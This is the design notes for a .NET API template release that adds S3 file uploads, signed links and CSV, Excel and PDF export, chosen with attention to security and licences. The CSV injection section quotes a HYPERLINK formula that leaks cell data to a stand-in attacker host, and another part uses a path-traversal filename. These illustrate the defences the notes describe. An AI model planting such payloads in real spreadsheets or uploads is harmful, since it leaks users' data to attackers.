# R06, Files and documents (0.6.0): why uploads and reports work like this

R06 adds two options. `--storage s3` gives the API private files on any S3-compatible storage, with
three ways to upload, checks on every file, thumbnails, signed links and a cleanup loop.
`--documents` adds CSV and Excel export and import of notes and a PDF report.

File uploads are one of the riskiest features an API can have: the client controls the bytes, the
name, the size and the claimed type. And document libraries are where the licence rule from R01
bit hardest. So this doc has two halves: **trust nothing about an upload**, and **read the licence
before the README**.

## Contents

1. [Files in object storage, records in the database](#1-files-in-object-storage-records-in-the-database)
2. [S3 as the interface; RustFS, not MinIO](#2-s3-as-the-interface-rustfs-not-minio)
3. [Three ways to upload, one check](#3-three-ways-to-upload-one-check)
4. [Type by signature, never by name](#4-type-by-signature-never-by-name)
5. [Size and pixel limits, virus scanning, hashes](#5-size-and-pixel-limits-virus-scanning-hashes)
6. [Thumbnails that strip metadata](#6-thumbnails-that-strip-metadata)
7. [Private bucket, signed links](#7-private-bucket-signed-links)
8. [The cleanup loop](#8-the-cleanup-loop)
9. [Choosing document libraries by licence](#9-choosing-document-libraries-by-licence)
10. [CSV injection](#10-csv-injection)
11. [Fonts in PDFs](#11-fonts-in-pdfs)
12. [Why `--documents` is its own option](#12-why---documents-is-its-own-option)
13. [Gotchas worth remembering](#13-gotchas-worth-remembering)

---

## 1. Files in object storage, records in the database

**The choice.** The file's bytes go to object storage (a bucket). A `StoredFile` row in the
database holds everything else: owner, name, detected type, size, SHA-256, status, expiry. The API
checks the row before handing out the bytes.

**Why not store files in the database.** It works for small files, but it bloats the database,
backups and replication, and every download ties up a database connection. Object storage is
built for large blobs, is cheap, and can hand files to clients directly (section 7).

**Why not the local disk.** Fine for one machine, but files vanish when a container is recreated
without a volume, and a second instance cannot see them. With S3 the API stays stateless.

**Why the row still matters.** Object storage has no idea who owns what. The row is where
authorization happens (owner-only, 404 for others, the R01 rule), and it is why `--storage s3`
needs a database (the catalog rule `storage-needs-database`).

**Object keys come from the server.** The key is derived from the file's server-generated id
(`ObjectKeys.Content(Id)`), never from the uploaded name. A name like `../../etc/passwd` or
`invoice.pdf` from two users can never collide or escape.

## 2. S3 as the interface; RustFS, not MinIO

```csharp
// templates/ek-api/src/MyProject.Api/Infrastructure/Storage/IObjectStorage.cs (trimmed)
/// Private object storage. Nothing in the bucket is public: clients reach an object only through
/// the API, or through a short-lived signed link the API hands out after checking who is asking.
internal interface IObjectStorage
{
    Task PutAsync(string key, Stream content, string contentType, CancellationToken cancellationToken);
    Task<Stream?> OpenReadAsync(string key, CancellationToken cancellationToken);
    Task<Uri> CreateUploadUrlAsync(string key, string contentType, TimeSpan lifetime);
    Task<Uri> CreateDownloadUrlAsync(string key, string fileName, TimeSpan lifetime);
    ...
}
```

**Why S3.** Amazon's S3 API is the de facto standard: Cloudflare R2, Backblaze B2, Wasabi, DigitalOcean
Spaces, Google Cloud Storage (interop mode) and every self-hosted option speak it. One
implementation (`AWSSDK.S3`, Apache-2.0) covers them all; switching provider is configuration.

**Why our own small interface.** The features need seven operations, not the hundreds in the AWS
SDK. A narrow interface keeps feature code readable, and tests can verify behaviour against a real
S3 server without mocking the SDK.

**Why RustFS in compose and tests.** MinIO was the obvious self-hosted choice for years. In 2025 it
stopped publishing its community container images (and earlier moved to AGPL), so the images the
template would reference were gone. RustFS is an Apache-2.0, S3-compatible server that runs as a
single container and works on arm64. Garage and SeaweedFS are other self-hosted alternatives if
you ever need to swap it; the API code would not change. For production on a Pi or VPS, Cloudflare R2 (no egress fees) is the suggested
target, by configuration.

**Settings for S3-compatible services.** `ForcePathStyle` is on (most self-hosted servers do not
do virtual-host bucket names), and the newer AWS SDK checksum behaviour is set to `WHEN_REQUIRED`,
because several S3-compatible services reject the extra checksum headers the SDK now sends by
default.

## 3. Three ways to upload, one check

| Route | How | Good for |
| --- | --- | --- |
| `POST /v1/files` | multipart upload through the API | small files, simplest client |
| `POST /v1/files/uploads` then `PUT` to the signed link, then `POST /v1/files/{id}/complete` | client uploads straight to storage | large files without loading the API |
| `/v1/files/tus` | the tus resumable upload protocol (tusdotnet, MIT) | large files over flaky mobile connections |

**Why three.** Each solves a real limitation of the others. Through the API is easy but every byte
passes through your server. A signed link offloads the bytes but cannot resume. tus resumes after a
dropped connection, which matters for a 200 MB video on a phone.

**Why one `FileProcessor`.** All three end in the same place:

```csharp
// templates/ek-api/src/MyProject.Api/Features/Files/FileProcessor.cs
/// Checks content and updates file to match; the caller saves it.
public async Task<Rejection> ProcessAsync(StoredFile file, Stream content, bool alreadyStored, CancellationToken cancellationToken)
```

If each route had its own checks, one would eventually miss a check, and attackers find the
weakest route. With a signed link the bytes arrive in storage *without* passing the API, so the
`complete` call reads them back and runs the same check, deleting the object if it is refused.

**Why tus over a custom chunked upload.** tus is an open protocol with client libraries for
browsers, iOS and Android (Uppy, TUSKit). A home-made chunk protocol would need home-made clients.

**Body size limit raised only on upload endpoints.** Kestrel's default request limit (about 30 MB)
protects every other endpoint from giant bodies. The upload endpoints raise it to
`Files:MaxSizeBytes`, nothing else does.

## 4. Type by signature, never by name

```csharp
// templates/ek-api/src/MyProject.Api/Features/Files/FileSignatures.cs (trimmed)
/// Tells a file's type from its first bytes, its signature, never from the name or the type the
/// client sent: a renamed executable stays an executable.
return header switch
{
    [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, ..] => Png,
    [0xFF, 0xD8, 0xFF, ..] => Jpeg,
    [0x25, 0x50, 0x44, 0x46, 0x2D, ..] => Pdf,            // "%PDF-"
    [0x50, 0x4B, 0x03, 0x04, ..] => extension == ".xlsx" ? Xlsx : Zip,
    _ when IsText(header) => extension == ".csv" ? Csv : Text,
    _ => null,
};
```

**The attack.** Upload `malware.exe` renamed to `cat.png` with `Content-Type: image/png`. If the
server trusts either, it stores and later serves an executable as an image, or an HTML file that
runs script in your domain.

**The defence.** Most formats start with fixed "magic bytes". The server reads the first bytes
and decides the type itself, then checks it against the allowlist in `Files:AllowedTypes`.
Unknown means refused. C# list patterns (`[0xFF, 0xD8, 0xFF, ..]`) make the table readable.

**Where the name still counts.** Only to tell apart formats that share a signature: an `.xlsx`
is a zip file inside; CSV and plain text are both just text. The name can only choose between
types the bytes already allow.

**Why not a library (Mime-Detective, FileSignatures).** For an allowlist of nine types, the table is
short and auditable. A library knowing thousands of types adds nothing when you accept nine.

## 5. Size and pixel limits, virus scanning, hashes

- **Size limit** (`Files:MaxSizeBytes`): checked against the bytes actually received, not the
  length the client claims, so lying about the length does not get a bigger file in.
- **Pixel limit for images.** A tiny PNG can claim to be 50,000 x 50,000 pixels; decoding it needs
  about 10 GB of memory (a "decompression bomb"). `ImageThumbnails.PixelCount` reads the size from
  the header *without decoding*, and anything over the limit is refused.
- **ClamAV, optional** (compose profile `scan`). The file is streamed to `clamd` with its `INSTREAM`
  command, so it never needs to be on a disk ClamAV can see. Optional because ClamAV needs about
  1 GB of memory for its signatures, too much for a small Pi, and its detection rate is modest.
  It is a layer, not a guarantee.
- **SHA-256** of every file, stored on the row: integrity checks, deduplication later, and evidence
  if a file is ever disputed.

## 6. Thumbnails that strip metadata

```csharp
// templates/ek-api/src/MyProject.Api/Features/Files/ImageThumbnails.cs
/// A WebP no larger than maxSide on its longest side, keeping the proportions, or null when the image
/// cannot be decoded. Re-encoding also drops the original's metadata, such as the GPS position a
/// phone writes into a photo.
```

**Why WebP.** Much smaller than JPEG or PNG at the same quality, and every current browser shows it.

**Why re-encoding is a privacy feature.** Phone photos carry EXIF data, often with GPS coordinates
of where they were taken (frequently someone's home). Thumbnails are the version most often shown
to others, and a re-encoded image carries none of it.

**Why SkiaSharp.** It is MIT, fast, and maintained by Microsoft (it powers .NET MAUI graphics).
**ImageSharp** is the more popular pure-.NET choice, but its licence (Six Labors Split License)
requires a paid licence for companies above a revenue threshold, which fails the licence rule.
Magick.NET is Apache-2.0 but much heavier.

**The cost of a native library.** SkiaSharp wraps a C++ library, so it needs the right native
binary for each platform. The template uses `SkiaSharp.NativeAssets.Linux.NoDependencies`, a build
that does not need fontconfig in the container, and CI builds the images for both amd64 and arm64
so a missing native library shows up there, not on your Pi.

## 7. Private bucket, signed links

**The choice.** The bucket is never public. Downloads go through the API (`Content-Disposition:
attachment`), or through a **pre-signed URL** (`GET /v1/files/{id}/link`) that the API creates
*after* checking ownership, valid for a few minutes.

**How a signed link works.** The API uses its storage credentials to sign "GET this one key until
this time" with HMAC. Storage verifies the signature; it never needs to know your users. Anyone
with the link can use it until it expires, so lifetimes are short.

**Why both.** Through the API is simplest and always authorized per request. Signed links take
the download traffic off the API, which matters for large files or many clients.

**Why `attachment`.** A file served inline from your domain is rendered by the browser. If an
uploaded HTML or SVG got through, it would run script on your origin (stored XSS). `attachment`
makes the browser download instead. The CSP from R01 (`default-src 'none'`) is a second layer.

**Owner-only, everywhere.** Another user's file answers 404 on every route, tus included, and API
keys get the scopes `files:read` and `files:write` (R02).

## 8. The cleanup loop

`FileCleanupLoop` is a `ScopedBackgroundLoop` (R04) that removes:

- temporary files past their expiry,
- uploads that were started (signed link) but never completed,
- refused files,
- **orphans**: objects in the bucket that no row points to (a crash between "store bytes" and
  "save row"),
- abandoned tus uploads.

**Why orphans happen and why a loop fixes them.** Storage and database cannot share a transaction.
Whatever order you write them in, a crash in between leaves one without the other. Rather than
pretending it cannot happen, the design accepts it and a periodic sweep tidies up. Orphans get a
grace period (`Files:OrphanGraceHours`) so an upload in progress is not swept away.

**Why a loop and not a job.** Every step is safe to repeat (deleting something twice is fine), so
the cheap pattern from R04 fits. Deletes use `ExecuteDeleteAsync` (a single `DELETE ... WHERE`
statement) rather than loading rows and removing them: when two instances, or a test and a loop,
clean at the same moment, a load-then-delete loses the race with a concurrency exception, while a
set-based delete just deletes whatever is still there.

## 9. Choosing document libraries by licence

This is where the licence rule from R01 made the decisions. The candidates and what happened:

| Library | Purpose | Licence | Decision |
| --- | --- | --- | --- |
| **MiniExcel** | CSV and Excel read and write | Apache-2.0 | **Used.** Fast and streams rows instead of loading the workbook. |
| **PdfPig** | PDF read and write | Apache-2.0 | **Used.** Lower-level for writing, but free. |
| QuestPDF | PDF with a nice layout API | Community licence, paid above a revenue limit | Rejected |
| PDFsharp 6.5+ | PDF | AGPL (6.2 was MIT) | Rejected: AGPL obliges you to publish your source in many setups |
| ClosedXML | Excel | MIT, but depends on SixLabors.Fonts | Rejected: the dependency has the Six Labors licence |
| EPPlus | Excel | Polyform Noncommercial, paid for commercial use | Rejected |
| ImageSharp | images | Six Labors Split License | Rejected (section 6) |

**Lessons.**

- **Check the licence of the exact version.** PDFsharp was MIT up to 6.2 and AGPL from 6.5. A
  version bump from Dependabot could change your legal position.
- **Check transitive dependencies.** ClosedXML itself is MIT; one of its dependencies is not. The
  package you add is not the only package you ship.
- **The trade-off is real.** QuestPDF has a much nicer API than PdfPig. The template takes the
  harder API so no generated project ever needs a licence review. The `PdfReports.Table` helper
  hides most of the low-level work.

Comments in `Directory.Packages.props` record each rejection, so a future contributor does not
"improve" the template by swapping in QuestPDF.

## 10. CSV injection

```csharp
// templates/ek-api/src/MyProject.Api/Infrastructure/Documents/Spreadsheets.cs
/// A cell starting with = + - @ or a tab is a formula to a spreadsheet, which can run commands or ...
internal static string? Defused(string? value) =>
    value is { Length: > 0 } && value[0] is '=' or '+' or '-' or '@' or '\t' or '\r' ? "'" + value : value;
```

**The attack.** A user names a note `=HYPERLINK("https://evil.example/?d="&A2, "Click")` (or worse,
a DDE formula that runs a command). An admin exports all notes to CSV and opens it in Excel. Excel
treats the cell as a formula and runs it on the admin's machine, with the admin's data.

**The defence.** OWASP's recommendation: prefix any cell that starts with a formula character with
a single quote, which spreadsheets show as text. It is applied on export *and* on import (so
imported data cannot carry a formula into the next export).

## 11. Fonts in PDFs

**The problem.** PDF's 14 standard fonts only cover Western European characters. A Turkish name
like "Şükrü Çağlar" comes out with missing or wrong letters, and fonts installed on the server vary
by machine (the container image has none).

**The choice.** Liberation Sans Regular and Bold (SIL Open Font License) are embedded as resources
in the assembly and embedded into every PDF. The OFL allows bundling the font as long as the licence
text travels with it, so `OFL.txt` sits next to the font files.

**Why Liberation Sans.** Metric-compatible with Arial (layouts look the same), wide language
coverage, free licence. Noto Sans covers even more scripts and is a good swap if needed.

**Template detail.** `.ttf` files are binary, so `template.json` marks them `copyOnly` (the template
engine must not try to replace `MyProject` inside them), and snapshot tests skip them.

## 12. Why `--documents` is its own option

The roadmap only named `--storage`. Documents became a separate option because the two are
independent: an API can export CSV without storing files, and store files without making PDFs.
Folding documents into storage would make every storage-less project unable to export, or every
storage project carry MiniExcel and PdfPig whether it uses them or not. The R05 catalog made adding
an option cheap, and it shows up in the presets (`saas-api` has both, `single-box` has storage only).

## 13. Gotchas worth remembering

These cost real debugging time while building R06. Each one is a general lesson:

- **Signed uploads sign the Content-Type exactly.** `StringContent` in .NET adds `; charset=utf-8`
  to the header, the signature no longer matches, and storage answers 403. When something is signed,
  every signed byte must match.
- **MiniExcel reads multi-line CSV cells with `\r\n`.** Tests comparing text must normalise line
  endings.
- **`FileOptions` already exists** (`System.IO.FileOptions`), so the settings class is
  `FilesOptions`. Avoid names that clash with the BCL; the error messages are confusing.
- **Migrations per combination grow.** Storage adds a table, so nine new migration sets
  (`.migrations/<db>/<auth>-files`). `add-migration.sh` now skips sets whose model did not change,
  using EF's `has-pending-model-changes`, so adding a migration does not create empty ones.

---

## Try it

1. Rename a text file to `photo.png` and upload it. Read the refusal.
2. Upload a phone photo, download its thumbnail, and check its EXIF data (for example with
   `exiftool`): there is none.
3. Create a note titled `=1+1`, export to CSV and open it in a spreadsheet.
4. Ask for a signed download link, wait past its lifetime, and try it again.
5. Read the licence of the next library you are about to add, and of its dependencies.

## Further reading

- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection
- tus protocol: https://tus.io/protocols/resumable-upload
- S3 presigned URLs: https://docs.aws.amazon.com/AmazonS3/latest/userguide/using-presigned-url.html
- Choose a licence, the AGPL explained: https://choosealicense.com/licenses/agpl-3.0/
